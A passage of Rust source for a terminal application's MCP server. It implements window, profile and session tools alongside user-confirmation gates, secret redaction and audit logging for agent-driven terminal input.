        // And on the window itself, so the name an agent chose is the one a
        // person sees in the taskbar rather than only the one `instance.list`
        // reports.
        let applied = unterm_engine::mcp_host()
            .map(|host| host.set_window_title(title.as_deref()))
            .unwrap_or(false);
        let window = unterm_engine::window_identity();
        Ok(json!({
            "ok": true,
            "title": title,
            "window": {
                "engine": window.engine,
                "title_owner": "server_info",
                "metadata_owner": "product_registry",
                "applied_to_native_window": applied,
                "uses_host_window": window.uses_host_window,
            },
            "lifecycle": {
                "title_owner": "server_info",
                "metadata_owner": "product_registry",
                "native_window_lifecycle": window.native_window_lifecycle,
                "uses_host_window": window.uses_host_window,
                "values_redacted": true,
            },
        }))
    }

    /// Bring one of this instance's windows to the foreground.
    ///
    /// Takes an optional `window_id` from `instance.list`. Without one this
    /// raises whichever window is already in front, which is what a caller
    /// with a single window means and what every caller meant before windows
    /// had ids.
    ///
    /// **Cross-instance focus is intentionally NOT supported here** — to
    /// focus a peer, connect to that peer's MCP port directly and call
    /// `instance.focus` there. Keeps the auth model simple (each instance
    /// only ever acts on itself with its own token).
    fn instance_focus(&self, params: &Value) -> Result<Value> {
        // No hop onto a GUI thread. The engine that needed one is gone, and
        // the requirement outlived it: this returned "GUI scheduler is not
        // configured" to every caller, so an agent asking the user to look at
        // something was answered with an error about an engine that no longer
        // exists. Raising a window is safe from any thread.
        let window_id = params.get("window_id").and_then(|id| id.as_u64());
        let focus = self.engine().focus_current_instance_window(window_id)?;
        Ok(json!({
            "ok": true,
            // Which window was raised, always -- a caller that named none
            // still learns where its message landed.
            "window_id": focus.mux_window_id,
            "mux_window_id": focus.mux_window_id,
            "window_engine": focus.window_engine,
            "uses_host_window": focus.uses_host_window,
        }))
    }

    /// `instance.new_window` — another window on this front end.
    ///
    /// The point is that it is not another process. Starting one costs a GPU
    /// adapter, ~200 ms, and it is not a first-call cost -- a process pays it
    /// every time. A window on a front end that already has one costs 31 ms.
    ///
    /// Returns the id the window will have. Reserved rather than observed:
    /// windows are built on the event loop and this call is not on it, so
    /// waiting would mean blocking an MCP worker on a frame. The number is
    /// already the window's -- nothing else will be given it -- so an agent
    /// can pass it straight to `instance.focus`.
    fn instance_new_window(&self, params: &Value) -> Result<Value> {
        // Optional, and the reason this takes params at all: `unterm start
        // --cwd` used to become a whole second process rather than hand the
        // window over, because handing it over lost the directory. A window
        // opened on the wrong folder is worse than a slow one, so the guard
        // was right until the ask could travel with the request.
        let cwd = params
            .get("cwd")
            .and_then(|value| value.as_str())
            .map(std::path::PathBuf::from);
        let profile = params
            .get("profile")
            .and_then(|value| value.as_str())
            .map(str::to_string);
        let command = params
            .get("command")
            .and_then(|value| value.as_array())
            .map(|argv| {
                argv.iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let window_id = self.engine().open_window_on(cwd, profile, command)?;
        Ok(json!({ "ok": true, "window_id": window_id }))
    }

    /// `instance.windows` — every window this front end is showing.
    ///
    /// Separate from `instance.list`, which is a registry of front ends on
    /// this machine and answers a different question. An agent that has just
    /// opened a window, or wants to put something in front of the person,
    /// needs the windows of the instance it is talking to and nothing else.
    fn instance_windows(&self) -> Result<Value> {
        let windows = self.engine().list_windows()?;
        Ok(json!({ "windows": windows }))
    }

    /// `profile.list` — every identity profile on disk plus a hint at
    /// which one is the registered default. We deliberately do NOT
    /// expose `secrets` values here — only counts and metadata, so an
    /// over-eager agent can't drain the keychain through one call.
    fn profile_list(&self) -> Result<Value> {
        let registry = unterm_profile::ProfileRegistry::load().context("load profile registry")?;
        let default = registry.default_id().map(str::to_string);
        let profiles: Vec<Value> = registry
            .iter_ordered()
            .into_iter()
            .map(|(id, p)| {
                json!({
                    "id": id,
                    "display_name": p.display_name,
                    "accent_color": p.accent_color,
                    "description": p.description,
                    "secret_count": p.secrets.len(),
                    "expiration_count": p.expiration.len(),
                    "is_default": default.as_deref() == Some(id),
                })
            })
            .collect();
        Ok(json!({
            "profiles": profiles,
            "default": default,
        }))
    }

    /// `profile.current` — which profile is bound to THIS Unterm
    /// window (the one running the MCP server the caller connected
    /// to). Agents use this to know "what identity will my next
    /// command run under?" before triggering destructive ops.
    fn profile_current(&self) -> Result<Value> {
        let info = unterm_services::server_info::read_current();
        Ok(json!({
            "instance": info.id,
            "profile": info.profile,
        }))
    }

    /// `profile.audit` — list secrets expiring within 7 days plus a
    /// healthy count for the rest. Lets agents proactively warn users
    /// (or surface a "rotate your GitHub PAT" reminder) without the
    /// user having to remember to check.
    fn profile_audit(&self) -> Result<Value> {
        let registry = unterm_profile::ProfileRegistry::load().context("load profile registry")?;
        let today = chrono::Local::now().date_naive();
        let mut warnings = Vec::new();
        let mut healthy = 0usize;
        for (id, p) in registry.iter_ordered() {
            for (env_name, date_str) in &p.expiration {
                let Ok(date) = chrono::NaiveDate::parse_from_str(date_str, "%Y-%m-%d") else {
                    continue;
                };
                let days = (date - today).num_days();
                if days <= 7 {
                    warnings.push(json!({
                        "profile": id,
                        "display_name": p.display_name,
                        "env_name": env_name,
                        "expires_on": date_str,
                        "days_remaining": days,
                    }));
                } else {
                    healthy += 1;
                }
            }
        }
        Ok(json!({
            "warnings": warnings,
            "healthy_count": healthy,
        }))
    }

    fn session_list(&self) -> Result<Value> {
        let engine = self.engine();
        let sessions: Vec<Value> = engine
            .list_sessions()?
            .into_iter()
            .map(|session| {
                json!({
                    "id": session.id,
                    "title": session.title,
                    "cols": session.cols,
                    "rows": session.rows,
                    "cursor": {
                        "x": session.cursor.x,
                        "y": session.cursor.y,
                        "visible": session.cursor.visible,
                    },
                    "is_dead": session.is_dead,
                    "is_active": session.is_active,
                    "domain_id": session.domain_id,
                    "shell": session.shell,
                })
            })
            .collect();

        Ok(json!({ "sessions": sessions }))
    }

    fn session_get(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let session = engine.get_session(pane_id)?;

        Ok(json!({
            "id": session.id,
            "title": session.title,
            "cols": session.cols,
            "rows": session.rows,
            "scrollback_rows": session.scrollback_rows,
            "cursor": {
                "x": session.cursor.x,
                "y": session.cursor.y,
                "visible": session.cursor.visible,
            },
            "is_dead": session.is_dead,
            "domain_id": session.domain_id,
            "shell": session.shell,
        }))
    }

    /// `session.split` — split an existing pane and return the
    /// newly-created pane's id. Pairs with `session.create` (new
    /// tab) and `session.input` (write to pane) to make the full
    /// "AI drives a side-by-side pane" loop available from MCP.
    ///
    /// Params:
    ///   - `id` or `session_id`  (required) — pane to split
    ///   - `direction`           "right" (default) | "left" | "down" | "up"
    ///   - `size_percent`        u8 (0..=100), defaults to 50
    ///   - `cwd`                 optional working dir for new pane
    ///
    /// Returns the same shape as `session.create`.
    fn session_split(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        // Source pane: accept the same id/session_id duality as get_pane
        // so callers don't have to remember which method takes which.
        let src_pane_id = self
            .resolve_pane_id(
                engine.as_ref(),
                params,
                PaneResolutionOptions::REQUIRED_EXISTING,
            )
            .map_err(|_| {
                anyhow!("Missing 'id' / 'session_id' / 'pane_id' (source pane to split)")
            })?;

        // Take an owned String here so the value can cross the async
        // closure boundary below — &str borrowed from `params` would
        // be tied to the request's lifetime which doesn't outlive the
        // spawned future.
        let dir_str: String = params
            .get("direction")
            .and_then(|v| v.as_str())
            .unwrap_or("right")
            .to_string();
        let direction = match dir_str.as_str() {
            "right" => SplitDirection::Right,
            "left" => SplitDirection::Left,
            "down" | "bottom" => SplitDirection::Down,
            "up" | "top" => SplitDirection::Up,
            other => {
                return Err(anyhow!(
                    "invalid direction {other:?} (use right|left|down|up)"
                ))
            }
        };

        let size_percent = params
            .get("size_percent")
            .and_then(|v| v.as_u64())
            .map(|n| n.min(100) as u8)
            .unwrap_or(50);
        if let Some(cwd) = params.get("cwd").and_then(|v| v.as_str()) {
            self.check_path_scope_param(
                "session.split",
                params,
                Some(src_pane_id),
                unterm_services::path_scope::PathAccess::Write,
                cwd,
            )?;
        } else {
            self.check_pane_cwd_path_scope(
                "session.split",
                params,
                src_pane_id,
                engine.as_ref(),
            )?;
        }

        // A split gets the same shell a fresh pane does, encoding switches
        // included. Without it a split pane on a non-UTF-8 Windows shows
        // boxes where the pane it was split from shows text.
        let command = launch_shell_for_new_pane();
        let mut env = unterm_services::launch_env::current_profile_env();
        env.extend(unterm_services::launch_env::read_unterm_proxy_env().unwrap_or_default());
        let profile_id = unterm_services::server_info::read_current().profile;
        let launch_policy = launch_policy_for_env(&env, &[], profile_id.as_deref());
        let request = SplitSessionRequest {
            source_pane_id: src_pane_id,
            direction,
            size_percent,
            command_dir: params.get("cwd").and_then(|v| v.as_str()).map(String::from),
            command,
            env,
            launch_policy,
        };

        // The engine resolves the direction into the arrangement and
        // returns it on the snapshot, so nothing has to be handed to
        // the front end on the side. That side channel was a
        // process-local map, and it could never have worked once the
        // sessions moved into a Core of their own.
        let session = engine.split_session(request)?;
        Ok(json!({
            "id": session.id,
            "session_id": session.id.to_string(),
            "title": session.title,
            "cols": session.cols,
            "rows": session.rows,
            "direction": dir_str,
            "src_pane_id": src_pane_id,
            "size_percent": size_percent,
        }))
    }

    /// `session.focus` — make this pane the active one in its tab
    /// (and bring its tab to the front of its window). Pairs with
    /// `session.split` so an agent can split-then-focus the new
    /// pane to make the side-by-side hand-off visible to the user
    /// immediately, rather than the new pane being a hidden split.
    ///
    /// Params: `id` or `session_id` (required).
    /// Returns: `{ ok: true, id: <focused-pane-id> }`.
    fn session_focus(&self, params: &Value) -> Result<Value> {
        // Focus is an engine operation; the MCP layer only preserves
        // the documented parameter and response contract.
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        engine.focus_session(pane_id)?;
        // A session lives in one window, and the front end only follows the
        // active session in the window that is in front. Without this the
        // call succeeded and the user saw nothing: an agent saying "look at
        // this" while the session was in the other window changed which
        // session was active and left both windows showing what they already
        // were. Raising it is best-effort -- a front end with one window, or
        // none, has nothing to do here.
        let window_id = engine
            .list_windows()
            .unwrap_or_default()
            .into_iter()
            .find(|window| window.panes.contains(&pane_id))
            .filter(|window| !window.focused)
            .map(|window| window.id);
        if let Some(window_id) = window_id {
            if let Err(err) = engine.focus_current_instance_window(Some(window_id)) {
                log::debug!("session.focus could not raise window {window_id}: {err:#}");
            }
        }
        Ok(json!({ "ok": true, "id": pane_id, "window_id": window_id }))
    }

    fn session_create(&self, params: &Value) -> Result<Value> {
        let cols = params.get("cols").and_then(|v| v.as_u64()).unwrap_or(120) as usize;
        let rows = params.get("rows").and_then(|v| v.as_u64()).unwrap_or(30) as usize;
        let command_dir = params
            .get("cwd")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());
        if let Some(cwd) = command_dir.as_deref() {
            self.check_path_scope_param(
                "session.create",
                params,
                None,
                unterm_services::path_scope::PathAccess::Write,
                cwd,
            )?;
        } else if params.get("path_scope").is_some() {
            let cwd = std::env::current_dir().context("resolve default session cwd")?;
            self.check_path_scope_param(
                "session.create",
                params,
                None,
                unterm_services::path_scope::PathAccess::Write,
                cwd,
            )?;
        }
        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string());
        let argv_command = argv_command_builder(params)?;
        let argv = argv_command.as_ref().map(|(argv, _)| argv.clone());
        let profile = params
            .get("profile")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string());

        // A caller naming a command gets exactly that; one that names none
        // gets the shell this surface would start, encoding switches and all,
        // rather than a bare default that writes its console codepage.
        let mut cmd_builder = match argv_command {
            Some((_, builder)) => Some(builder),
            None => match command.as_deref() {
                Some(command) => Some(shell_command_builder(command)),
                None => launch_shell_for_new_pane(),
            },
        };
        let command_provided = command.is_some() || argv.is_some();
        let default_shell = default_shell_launch_decision(command_provided);
        if let Some(cwd) = command_dir.as_deref() {
            if let Some(builder) = cmd_builder.as_mut() {
                builder.cwd(cwd);
            }
        }
        let mut env = unterm_services::launch_env::read_unterm_proxy_env().unwrap_or_default();
        let overlay_keys;
        {
            let state = mcp_state().lock();
            overlay_keys = state.launch_env_overlay.keys().cloned().collect::<Vec<_>>();
            env.extend(
                state
                    .launch_env_overlay
                    .iter()
                    .map(|(key, value)| (key.clone(), value.clone())),
            );
        }
        let mut overlay_keys_sorted = overlay_keys.clone();
        overlay_keys_sorted.sort();
        let inherited_profile = unterm_services::server_info::read_current().profile;
        let effective_profile = profile.as_deref().or(inherited_profile.as_deref());
        let resolved_profile = if let Some(profile) = effective_profile {
            let (profile_id, profile_env) = resolve_profile_env(profile)?;
            env.extend(profile_env);
            if !env
                .iter()
                .any(|(key, _)| key.eq_ignore_ascii_case("UNTERM_PROFILE"))
            {
                env.push(("UNTERM_PROFILE".to_string(), profile_id.clone()));
            }
            Some(profile_id)
        } else {
            None
        };
        let mut launch_policy =
            launch_policy_for_env(&env, &overlay_keys, resolved_profile.as_deref());
        apply_launch_policy_requests(params, &mut launch_policy);

        let engine = self.engine();
        let session = engine.create_session(CreateSessionRequest {
            cols,
            rows,
            command_dir,
            command: cmd_builder,
            env,
            launch_policy,
        })?;
        let launch_context = session.shell.launch_context.clone();
        let launch_proxy_env_keys = launch_context.proxy_env_keys.clone();
        let launch_policy = launch_context.policy.clone();

        Ok(json!({
            "id": session.id,
            "session_id": session.id.to_string(),
            "title": session.title,
            "cols": session.cols,
            "rows": session.rows,
            "profile": resolved_profile,
            "command": command,
            "argv": argv,
            "launch": {
                "context": launch_context,
                "decision": {
                    "source": "session.create",
                    "profile_requested": profile.is_some(),
                    "profile_source": if profile.is_some() {
                        "explicit"
                    } else if resolved_profile.is_some() {
                        "window"
                    } else {
                        "none"
                    },
                    "overlay_env_keys": overlay_keys_sorted,
                    "proxy_env_keys": launch_proxy_env_keys,
                    "command_provided": command_provided,
                    "command_source": if argv.is_some() {
                        "explicit_argv"
                    } else if command.is_some() {
                        "explicit_command"
                    } else {
                        "default_shell"
                    },
                    "default_shell": default_shell,
                    "policy": launch_policy,
                    "values_redacted": true,
                },
            },
        }))
    }

    fn session_input(&self, params: &Value) -> Result<Value> {
        let input = params
            .get("input")
            .or_else(|| params.get("text"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'input' (or compatibility alias 'text') parameter"))?;
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("session.input", params, pane_id, engine.as_ref())?;

        // Gate the write on a user confirmation banner if policy
        // demands it. `Allow` continues to the audit + write below;
        // `Block` returns -32004 to the agent.
        match self.gate_pty_write("session.input", pane_id, input)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        // PTY 字节流一旦写下去就和用户手敲不可区分，必须留下审计痕迹。
        self.audit(
            "session.input",
            Some(&pane_id.to_string()),
            &input_preview(input),
        );
        engine.write_input(pane_id, input)?;
        Ok(json!({"status": "ok"}))
    }

    fn session_paste(&self, params: &Value) -> Result<Value> {
        let text = params
            .get("text")
            .or_else(|| params.get("input"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'text' (or compatibility alias 'input') parameter"))?;
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("session.paste", params, pane_id, engine.as_ref())?;

        match self.gate_pty_write("session.paste", pane_id, text)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit(
            "session.paste",
            Some(&pane_id.to_string()),
            &input_preview(text),
        );
        engine.paste_input(pane_id, text)?;
        Ok(json!({"status": "ok"}))
    }


    /// Ask before something that cannot be taken back.
    ///
    /// Only for actions the gateway classifies as destructive; everything
    /// else returns immediately, so this costs a registry lookup on the hot
    /// path and nothing more. A trusted agent — by config or by a standing
    /// grant at this risk — passes straight through, which is what makes
    /// "always allow" worth clicking.
    fn gate_destructive(&self, method: &str) -> Result<()> {
        if unterm_gateway::risk_of(method) != Some(unterm_gateway::Risk::Destructive) {
            return Ok(());
        }
        let cfg = unterm_services::settings::current();
        if matches!(
            cfg.mcp_input_confirmation,
            unterm_services::settings::McpInputConfirmation::Never
        ) {
            return Ok(());
        }
        let agent = current_agent_label();
        // Only an identified agent is gated. Two reasons, and the second is
        // the stronger one:
        //
        // The user driving `unterm-cli` *is* the user; raising a banner
        // asking them to confirm the command they just typed is absurd, and
        // on a headless Core it would refuse it outright.
        //
        // And an anonymous caller has no identity to trust. The escape hatch
        // would have to be "always allow anonymous", which is a blanket hole
        // for every unidentified caller at once — a worse outcome than not
        // gating it. This product's trust model is agent-keyed throughout;
        // the gate follows it rather than inventing a second one.
        if agent == "anonymous" {
            return Ok(());
        }
        if cfg.mcp_trusted_agents.iter().any(|n| n == &agent)
            || agent_is_granted(&agent, method, "destructive")
        {
            return Ok(());
        }

        // Nobody to ask means no. An irreversible action performed because
        // there was no window to raise the question is the exact outcome this
        // gate exists to prevent.
        if !unterm_engine::mcp_host().is_some_and(|host| host.can_prompt()) {
            self.audit(
                "mcp.confirm.headless_block",
                None,
                &format!("agent={agent} method={method} (no window to approve a destructive action)"),
            );
            return Err(anyhow!(
                "blocked: {method} cannot be undone and no Unterm window is open to approve it. \
                 Add the agent to mcp_trusted_agents, or set mcp_input_confirmation=never."
            ));
        }

        let timeout_ms = cfg.mcp_confirmation_timeout_ms.max(1000);
        let decision = unterm_engine::mcp_host()
            .context("no front end to ask")
            .and_then(|host| {
                host.ask_confirmation(&json!({
                    "agent": agent,
                    "method": method,
                    "pane_id": 0,
                    "input_preview": format!("{method} (cannot be undone)"),
                    "timeout_ms": timeout_ms,
                    "risk": "destructive",
                }))
            })
            .ok()
            .and_then(|value| {
                value
                    .get("decision")
                    .and_then(|d| d.as_str())
                    .map(str::to_string)
            });

        match decision.as_deref() {
            Some("allow") | Some("always_allow") => {
                self.audit("mcp.confirm.allow", None, &format!("agent={agent} method={method}"));
                Ok(())
            }
            Some("block") => {
                self.audit("mcp.confirm.block", None, &format!("agent={agent} method={method}"));
                Err(anyhow!("refused: the user declined {method}"))
            }
            _ => {
                self.audit("mcp.confirm.timeout", None, &format!("agent={agent} method={method}"));
                Err(anyhow!(
                    "unanswered: the confirmation for {method} went unanswered, so nothing was \
                     done. Nobody refused it -- try again with someone at the window."
                ))
            }
        }
    }

    /// Decide whether a PTY-writing MCP call should proceed and, when
    /// required, park the worker on a confirmation banner.
    ///
    /// Returns `GateOutcome::Allow` when the call may proceed (either
    /// because policy is `Never`, the agent is on the trusted list,
    /// the user already picked "always allow" this session, or
    /// because they just clicked Allow on the banner). Returns
    /// `GateOutcome::Block(why)` when the user denied (or the banner
    /// timed out).
    fn gate_pty_write(&self, method: &str, pane_id: usize, input: &str) -> Result<GateOutcome> {
        let cfg = unterm_services::settings::current();
        let agent = current_agent_label();
        let preview = input_preview(input);
        // The PTY door asks the same gateway as every other door. This is
        // the one with no protocol of its own, which is exactly why it is the
        // easiest to leave holding a private copy of the rules.
        let gateway = {
            let policy = {
                let state = mcp_state().lock();
                unterm_services::gateway::SettingsPolicy::new(
                    state.policy.enabled,
                    state.policy.blocked_patterns.clone(),
                    state.policy.allowed_patterns.clone(),
                )
            };
            let context = unterm_gateway::ActionContext::new(method)
                .entry(unterm_gateway::Entry::Pty)
                .actor(agent.clone())
                .resource(pane_id.to_string())
                .command(input);
            unterm_services::gateway::admit(&context, &policy).verdict
        };
        if !gateway.allowed {
            self.audit(
                "mcp.gateway.denied",
                Some(&pane_id.to_string()),
                &format!(
                    "method={} code={} risk={} reason={} {}",
                    method,
                    gateway.code.as_str(),
                    gateway.risk.as_str(),
                    gateway.reason,
                    preview
                ),
            );
            return Ok(GateOutcome::Block(format!(
                "{}: {}",
                gateway.code.as_str(),
                gateway.reason
            )));
        }

        // 1) Configured `Never` → no banner ever.
        // 2) Agent name on the static trust list → skip.
        // 3) User previously chose AlwaysAllow this session → skip.
        if current_client_role() == Some(unterm_protocol::ProcessRole::Cli) {
            return Ok(GateOutcome::Allow);
        }

        let policy = cfg.mcp_input_confirmation;
        // Three ways an agent can already be trusted, and they mean
        // different things. The config list is the user declaring it up
        // front; the session set is this process remembering; the grant is
        // the durable record of an "always allow" they clicked — the only
        // one of the three that can be revoked from the same place as every
        // other permission.
        let trusted_static = cfg.mcp_trusted_agents.iter().any(|n| n == &agent)
            || agent_is_granted(&agent, method, gateway.risk.as_str());
        let already_confirmed = {
            let state = mcp_state().lock();
            state.confirmed_agents.contains(&agent)
        };
        let needs_banner = if trusted_static || already_confirmed {
            false
        } else {
            match policy {
                unterm_services::settings::McpInputConfirmation::Never => false,
                unterm_services::settings::McpInputConfirmation::Always => true,
                unterm_services::settings::McpInputConfirmation::FirstTimePerAgent => {
                    // The first PTY write by this agent triggers a
                    // banner; once allowed, that decision sticks for
                    // the session via `confirmed_agents`. So this
                    // arm is only reached on the *very first* write.
                    let state = mcp_state().lock();
                    !state.agents_with_input_history.contains(&agent)
                }
            }
        };
        if !needs_banner {
            return Ok(GateOutcome::Allow);
        }

        // Headless: no front end will ever paint the banner, let alone
        // answer it. Fail closed now, with an audit entry pointing at
        // the ways to authorize, instead of parking every caller on
        // the confirmation timeout.
        if !unterm_engine::mcp_host().is_some_and(|host| host.can_prompt()) {
            self.audit(
                "mcp.confirm.headless_block",
                Some(&pane_id.to_string()),
                &format!(
                    "agent={agent} {preview} (no window to confirm; trust the agent or set mcp_input_confirmation=never)"
                ),
            );
            return Ok(GateOutcome::Block(
                "blocked: no Unterm window is open to approve this write. Add the agent to \
                 mcp_trusted_agents, or set mcp_input_confirmation=never."
                    .to_string(),
            ));
        }

        // Put the question in front of whoever is hosting a window and
        // wait. One call whichever process the window is in: in a GUI
        // the host answers it from this very queue, and in a Core it
        // forwards the question to the attached window, which answers it
        // from *its* copy of the same queue. The window's own UI code
        // never learns the difference.
        let timeout_ms = cfg.mcp_confirmation_timeout_ms.max(1000);
        let decision = unterm_engine::mcp_host()
            .context("no front end to ask")
            .and_then(|host| {
                host.ask_confirmation(&json!({
                    "agent": agent,
                    "method": method,
                    "pane_id": pane_id,
                    "input_preview": preview,
                    "timeout_ms": timeout_ms,
                    // So "always allow" grants exactly what was on screen.
                    "risk": gateway.risk.as_str(),
                }))
            })
            .map_err(|_| ())
            .and_then(|answer| {
                ConfirmationDecision::from_wire(answer.as_str().unwrap_or_default()).ok_or(())
            });
        let outcome = match decision {
            Ok(ConfirmationDecision::Allow) => {
                self.audit(
                    "mcp.confirm.allow",
                    Some(&pane_id.to_string()),
                    &format!("agent={} {}", agent, preview),
                );
                Ok(GateOutcome::Allow)
            }
            Ok(ConfirmationDecision::AlwaysAllow) => {
                self.audit(
                    "mcp.confirm.always_allow",
                    Some(&pane_id.to_string()),
                    &format!("agent={} {}", agent, preview),
                );
                Ok(GateOutcome::Allow)
            }
            Ok(ConfirmationDecision::Block) => {
                self.audit(
                    "mcp.confirm.block",
                    Some(&pane_id.to_string()),
                    &format!("agent={} {}", agent, preview),
                );
                Ok(GateOutcome::Block(
                    "refused: the user declined this write in the Unterm window".to_string(),
                ))
            }
            Err(_) => {
                // Nobody answered -- either the question timed out at
                // the window or there was no window to put it on.
                // Cleaning up the queued banner belongs to whoever owns
                // the queue, which is `prompt_locally`, in the process
                // that drew it.
                self.audit(
                    "mcp.confirm.timeout",
                    Some(&pane_id.to_string()),
                    &format!("agent={} {}", agent, preview),
                );
                Ok(GateOutcome::Block(format!(
                    "unanswered: the confirmation in the Unterm window went unanswered for {}s, \
                     so the write was not performed. Nobody refused it -- try again with someone \
                     at the window.",
                    timeout_ms / 1000
                )))
            }
        };
        outcome
    }

    fn session_resize(&self, params: &Value) -> Result<Value> {
        let cols = params
            .get("cols")
            .and_then(|v| v.as_u64())
            .ok_or_else(|| anyhow!("Missing 'cols'"))? as usize;
        let rows = params
            .get("rows")
            .and_then(|v| v.as_u64())
            .ok_or_else(|| anyhow!("Missing 'rows'"))? as usize;

        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        engine.resize_session(pane_id, cols, rows)?;
        Ok(json!({"status": "ok"}))
    }

    fn session_destroy(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.audit("session.destroy", Some(&pane_id.to_string()), "destroy");
        engine.destroy_session(pane_id)?;
        Ok(json!({"status": "ok", "destroyed": true}))
    }

    fn session_idle(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let activity = engine.activity(pane_id)?;
        Ok(json!({
            "idle": activity.idle,
            "foreground_process": activity.foreground_process,
            "process": activity.process,
            "input": activity.input,
            "output": activity.output,
            "paste": activity.paste,
        }))
    }

    fn session_cwd(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let cwd = engine.shell(pane_id)?.cwd.unwrap_or_default();
        Ok(json!({"cwd": cwd}))
    }

    fn session_env(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        if engine.name() == "wezterm" {
            // WezTerm doesn't expose per-pane env vars directly.
            return Ok(
                json!({"supported": false, "value": null, "message": "Environment variable reading not supported in WezTerm mode"}),
            );
        }

        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let shell = engine.shell(pane_id)?;
        let name_filter = params
            .get("name")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        let mut names = shell.launch_env_keys;
        names.sort();
        names.dedup();
        if let Some(filter) = name_filter.as_deref() {
            names.retain(|name| name == filter);
        }
        let variables: Vec<Value> = names
            .into_iter()
            .map(|name| {
                json!({
                    "name": name,
                    "value": null,
                    "redacted": true,
                    "scope": "launch",
                })
            })
            .collect();

        Ok(json!({
            "supported": true,
            "mutable": false,
            "scope": "launch",
            "variables": variables,
            "launch_context": shell.launch_context,
            "message": "Only launch environment variable names are exposed; values are redacted to avoid leaking profile secrets.",
        }))
    }

    fn session_set_env(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        if engine.name() == "wezterm" {
            return Ok(json!({
                "status": "ok",
                "supported": false,
                "message": "Live environment variable mutation is not supported in WezTerm mode; use session.create launch env/profile/proxy context for child shells.",
            }));
        }

        let name = params
            .get("name")
            .and_then(|value| value.as_str())
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .ok_or_else(|| anyhow!("Missing 'name' parameter"))?;
        if !name.chars().enumerate().all(|(index, ch)| {
            ch == '_' || ch.is_ascii_alphanumeric() && (index > 0 || !ch.is_ascii_digit())
        }) {
            return Err(anyhow!("Invalid environment variable name: {name}"));
        }

        let mut state = mcp_state().lock();
        let removed = match params.get("value") {
            Some(value) if !value.is_null() => {
                let value = value
                    .as_str()
                    .ok_or_else(|| anyhow!("'value' must be a string or null"))?;
                state
                    .launch_env_overlay
                    .insert(name.to_string(), value.to_string());
                false
            }
            _ => state.launch_env_overlay.remove(name).is_some(),
        };
        let mut names = state
            .launch_env_overlay
            .keys()
            .cloned()
            .collect::<Vec<String>>();
        names.sort();

        Ok(json!({
            "status": "ok",
            "supported": true,
            "mutable": false,
            "scope": "future_launch",
            "name": name,
            "removed": removed,
            "overlay_keys": names,
            "message": "Stored a future-launch environment overlay for new sessions only; existing shells are not mutated and values are not returned.",
        }))
    }

    fn session_history(&self, params: &Value) -> Result<Value> {
        let limit = params.get("limit").and_then(|v| v.as_u64()).unwrap_or(100) as usize;
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let entries: Vec<Value> = engine
            .read_scrollback(pane_id, limit)?
            .into_iter()
            .map(|text| json!({"text": text}))
            .collect();

        Ok(json!({"entries": entries, "count": entries.len()}))
    }

    fn session_audit_log(&self, params: &Value) -> Result<Value> {
        let limit = params.get("limit").and_then(|v| v.as_u64()).unwrap_or(50) as usize;
        let session_filter = params.get("session_id").and_then(|v| v.as_str());
        let state = mcp_state().lock();
        let entries: Vec<_> = state
            .audit_log
            .iter()
            .rev()
            .filter(|e| session_filter.map_or(true, |sid| e.session_id.as_deref() == Some(sid)))
            .take(limit)
            .cloned()
            .collect();
        Ok(json!(entries))
    }

    // --- Agent identity ---

    /// Record the calling connection's claimed identity. Self-asserted;
    /// we trust the agent label only to *group* activity, never to grant
    /// privileges — the auth token is still what gates access.
    fn agent_identify(&self, ctx: &ConnectionContext, params: &Value) -> Result<Value> {
        let name = params
            .get("name")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'name' parameter"))?
            .trim();
        if name.is_empty() {
            return Err(anyhow!("'name' must be non-empty"));
        }
        if name.len() > 64 {
            return Err(anyhow!("'name' must be ≤ 64 chars"));
        }
        let version = params
            .get("version")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());
        let capabilities: Vec<String> = params
            .get("capabilities")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|c| c.as_str().map(|s| s.to_string()))
